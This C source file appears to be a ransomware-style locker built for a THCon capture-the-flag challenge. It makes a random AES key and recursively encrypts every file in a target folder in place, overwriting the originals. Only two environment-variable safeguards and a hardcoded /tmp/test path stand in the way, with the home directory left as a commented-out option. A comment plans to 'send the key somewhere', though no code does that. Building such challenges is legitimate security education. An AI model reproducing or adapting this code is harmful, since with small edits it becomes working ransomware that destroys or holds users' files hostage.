#include <stdio.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <dirent.h>
#include <errno.h>
#include "crypto.h"

int lock_folder(unsigned char *key, int dirfd);
int unlock_folder(unsigned char *key, int dirfd);
int lock_file(unsigned char *key, int ftarget);
int unlock_file(unsigned char *key, int ftarget);

/*
 * Main:
 * * Check the different safeguards before doing anything.
 * * Generate a random key.
 * * Send the key somewhere (before encrypting).
 * * Recursively lock / unlock a folder in place.
 * */
int main(int argc, char *argv[])
{
    /* Folder which is to be encrypted. */
    char *target_folder;
    int target_fd;

    /* A 256 bit key. */
    unsigned char *key;

    /* Safeguards. */
    char *safety_1 = getenv("CPTLCK_SFTY_1");
    char *safety_2 = getenv("CPTLCK_SFTY_2");

    /* target_folder = getenv("HOME"); */
    target_folder = "/tmp/test";
    printf("Target folder for encrypting: %s\n", target_folder);

    /* Safety check (environment variables). */
    if (safety_1 == NULL || (strcmp(safety_1, "ENCRYPT") != 0) || safety_2 == NULL || (strcmp(safety_2, "DANGER") != 0))
    {
        fprintf(stderr, "You fool! You nearly got your computer destroyed!\n");
        fprintf(stderr, "DON'T launch this program outside of the THCon challenge VM!\n");
        fprintf(stderr, "Neither the authors nor the THCon should be held responsible for any damage resulting of the use of this program.\n");
        abort();
    }

    initialise_openssl();

    /* Generate a random 256 bit key. */
    key = (unsigned char *) malloc(KEY_SIZE*sizeof(unsigned char));
    if (!get_random_bytes(key, KEY_SIZE)) handleErrors();

    /* Lock (encrypt in place) the target folder. */
    target_fd = open(target_folder, O_RDONLY | O_DIRECTORY);
    lock_folder(key, target_fd);

    close_openssl();
    free(key);

    return 0;
}

/*
 * Recursively encrypt inplace every file within the folder designed by dirfd.
 * * dirfd is closed at the end of this function so it should not be used again.
 * */
int lock_folder(unsigned char *key, int dirfd)
{
    DIR *dp;
    struct dirent *ep;
    int current_fd;

    if (dirfd < 0)
    {
        perror("Couldn't open the directory!");
        return -1;
    }

    /* Get a directory stream. */
    dp = fdopendir(dirfd);

    if (dp == NULL)
    {
        perror("Couldn't open the directory");
        return -2;
    }

    while (ep = readdir(dp))
    {
        switch (ep->d_type)
        {
            case DT_REG:
                printf("F: %s\n", ep->d_name);
                /* Open the current file. */
                current_fd = openat(dirfd, ep->d_name, O_RDWR);
                /* Apply the action to this file, the file descruptor will be closed by the underlying function. */
                lock_file(key, current_fd);
                break;
            case DT_DIR:
                if ((strncmp(ep->d_name, "..", 3) != 0) && ((strncmp(ep->d_name, ".", 2) != 0)))
                {
                    printf("D: %s\n", ep->d_name);
                    /* Open the current folder. */
                    current_fd = openat(dirfd, ep->d_name, O_RDONLY | O_DIRECTORY);
                    /* Apply the action to this folder, the descriptor will be closed by the underlying function. */
                    lock_folder(key, current_fd);
                }
                break;
            default:
                printf("U: %s\n", ep->d_name);
                break;
        };
    }

    closedir(dp);

    return 0;
}

/*
 * Encrypt the file pointed out by ftarget (in place).
 * * Generate a random IV for the file.
 * * Encrypt the plaintext file using key and iv to a temporary file.
 * * Copy the ciphertext temporary file back to the original file.
 * * Close both file descriptors, ftarget should not be used again.
 * */
int lock_file(unsigned char *key, int ftarget)
{
    /* A 128 bit IV - Different for each file. */
    unsigned char *iv;

    /* File descriptors to be used. */
    int ftmp;
    char path_template[8];

    /* Used for copying files. */
    int size;
    int total_size = 0;
    char *buffer = (char*) malloc(256*sizeof(char));

    /* Check that the target file was correctly opened. */
    if(ftarget < 0)
    {
        /* Handle errors. */
        perror("Error opening source file!\n");
        return -1;
    }

    /* Open a temporary file that will act as a buffer. */
    memset(path_template, 'X', 8);
    path_template[7] = '\0';
    ftmp = mkstemp(path_template);
    if (ftmp < 0)
    {
        /* Handle errors. */
        perror("Error opening destination file!\n");
        return -2;
    }

    /* Generate IV and key. */
    iv = (unsigned char *) malloc(IV_SIZE*sizeof(unsigned char));
    if (!get_random_bytes(iv, IV_SIZE)) handleErrors();

    /* Encryption from ftarget to ftmp. */
    encrypt (key, iv, ftarget, ftmp);

    /* Reset the read/write file offset of both files. */
    lseek(ftarget, 0, SEEK_SET);
    lseek(ftmp, 0, SEEK_SET);

    /* Copy ftmp to ftarget (therefore erasing previous plaintext data). */
    total_size = 0;
    while((size = read(ftmp, buffer, 256)) > 0)
    {
        size = write(ftarget, buffer, size);
        if (size < 0)
        {
            perror("Error while writing ciphertext back to file:");
            break;
        }
        else
        {
            total_size += size;
        }
    }

    /* Truncate the file if needed. */
    if (total_size > 0)
    {
        if(ftruncate(ftarget, total_size) < 0)
            perror("Error while truncating file:");
    }

    /* Close both file descriptors. */
    close(ftmp);
    close(ftarget);

    return 0;
}

/*
 * Decrypt (in place) the ciphertext file pointed out by ftarget.
 * * Decrypt the ciphertext from ftarget to a temporary file.
 * * Copy the plaintext result back to ftarget.
 * * Close both file descriptors, ftarget should not be used again.
 * */
int unlock_file(unsigned char *key, int ftarget)
{
    /* File descriptors to be used. */
    int ftmp;
    char path_template[8];

    /* Used for copying files. */
    int size;
    int total_size = 0;
    char buffer[256];

    /* Check that the target file was correctly opened. */
    if(ftarget < 0)
    {
        /* Handle errors. */
        perror("Error opening source file!\n");
        return -1;
    }

    /* Open a temporary file that will act as a buffer. */
    memset(path_template, 'X', 8);
    path_template[7] = '\0';
    ftmp = mkstemp(path_template);
    if (ftmp < 0)
    {
        /* Handle errors. */
        perror("Error opening destination file!\n");
        return -2;
    }

    /* Decryption of fcipher to fdec. */
    decrypt(key, ftarget, ftmp);

    /* Reset the read/write file offset of both files. */
    lseek(ftarget, 0, SEEK_SET);
    lseek(ftmp, 0, SEEK_SET);

    /* Copy ftmp to ftarget (therefore erasing previous plaintext data). */
    total_size = 0;
    while((size = read(ftmp, buffer, 256)) > 0)
    {
        size = write(ftarget, buffer, size);
        if (size < 0)
        {
            perror("Error while writing ciphertext back to file:");
            break;
        }
        else
        {
            total_size += size;
        }
    }

    /* Truncate the file if needed. */
    if (total_size > 0)
    {
        if(ftruncate(ftarget, total_size) < 0)
            perror("Error while truncating file:");
    }

    /* Close both file descriptors. */
    close(ftmp);
    close(ftarget);

    return 0;
}
